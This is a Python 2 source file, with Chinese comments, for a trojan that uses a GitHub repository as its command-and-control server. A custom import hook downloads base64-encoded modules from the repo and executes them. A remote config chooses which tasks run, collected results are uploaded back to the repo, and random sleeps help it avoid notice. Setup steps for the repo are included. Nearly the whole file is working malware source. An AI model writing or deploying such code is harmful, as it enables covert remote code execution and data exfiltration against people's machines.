# coding=utf-8
"""
前置依赖
pip install github3.py

建立一个repo
mkdir trojan
cd trojan
git init
mkdir modules
mkdir config
mkdir data
touch modules/.gitignore
touch config/.gitignore
touch data/.gitignore
git add .
git commit -m 'Add repo structure for trojan'
git remote add origin https://github.com/Hope6537/custom_python_trojan_example.git
git push origin master

或者从repo中获取
git clone https://github.com/Hope6537/custom_python_trojan_example.git
"""
import Queue
import base64
import commands
import imp
import json
import os
import random
import sys
import threading
import time

from github3 import login

trojan_id = "simple"

trojan_config = "%s.json" % trojan_id
data_path = "data/%s/" % trojan_id
trojan_modules = []

task_queue = Queue.Queue()
configured = False


class GitImporter(object):
    """
    可以通过自定义导入模块中的行为来控制功能
    """

    def __init__(self):

        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        """
        寻找模块
        :param fullname:
        :param path:
        :return:
        """
        if configured:
            print "[*] Attempting to retrieve %s" % fullname
            # 获取远程文件
            new_library = get_file_contents("modules/%s" % fullname)

            # 如果当前存在模块
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self

        return None

    def load_module(self, name):
        """
        完成模块的实际加载过程
        :param name:
        :return:
        """
        # 通过imp创建一个空的模块对象
        module = imp.new_module(name)

        exec self.current_module_code in module.__dict__
        # 然后将之前读取到的模块代码写入到这里,添加到sys列表中
        sys.modules[name] = module

        return module


def connect_to_github():
    """
    连接到Github
    :return:
    """
    gh = login(username="example_user", password="mypassword")
    repo = gh.repository("example_user", "custom_python_trojan_example")
    branch = repo.branch("master")

    # 获取已经在Github上的目标工程
    (status, output) = commands.getstatusoutput("rm -rf custom_python_trojan_example")
    print (status, output)
    (status, output) = commands.getstatusoutput(
        "git clone https://github.com/example_user/custom_python_trojan_example.git")
    print (status, output)

    return gh, repo, branch


def get_file_contents(filepath):
    """
    获取文件信息,从远程的repo中抓取文件
    :param filepath:
    :return:
    """
    gh, repo, branch = connect_to_github()

    tree = branch.commit.commit.tree.recurse()

    for filename in tree.tree:

        if filepath in filename.path:
            print "[*] Found file %s" % filepath

            blob = repo.blob(filename._json_data['sha'])

            return blob.content

    return None


def get_trojan_config():
    """
    获取repo中的配置文件
    :return:
    """
    global configured

    config_json = get_file_contents(trojan_config)
    config = json.loads(base64.b64decode(config_json))
    configured = True

    for task in config:

        if task['module'] not in sys.modules:
            exec ("import %s" % task['module'])

    return config


def store_module_result(data):
    """
    将收集的信息推送到repo中
    :param data:
    :return:
    """
    gh, repo, branch = connect_to_github()
    if not os.path.exists(os.getcwd() + "/custom_python_trojan_example/data/%s" % trojan_id):
        os.mkdir(os.getcwd() + "/custom_python_trojan_example/data/%s" % trojan_id)
    remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000, 100000))

    repo.create_file(remote_path, "Commit message", base64.b64encode(data))

    return


def module_runner(module):
    """
    运行模块
    :param module:
    :return:
    """
    task_queue.put(1)
    # 调用run来进行函数的执行
    result = sys.modules[module].run()
    task_queue.get()

    # 保存结果
    store_module_result(result)

    return


def driver():
    # 木马的主循环 首先运行自定义模块导入器
    sys.meta_path = [GitImporter()]

    while True:

        if task_queue.empty():
            # 然后从repo中获取木马的配置文件
            config = get_trojan_config()

            # 然后单独建立线程来运行模块
            for task in config:
                t = threading.Thread(target=module_runner, args=(task['module'],))
                t.start()
                time.sleep(random.randint(1, 10))

        time.sleep(random.randint(1000, 10000))


driver()
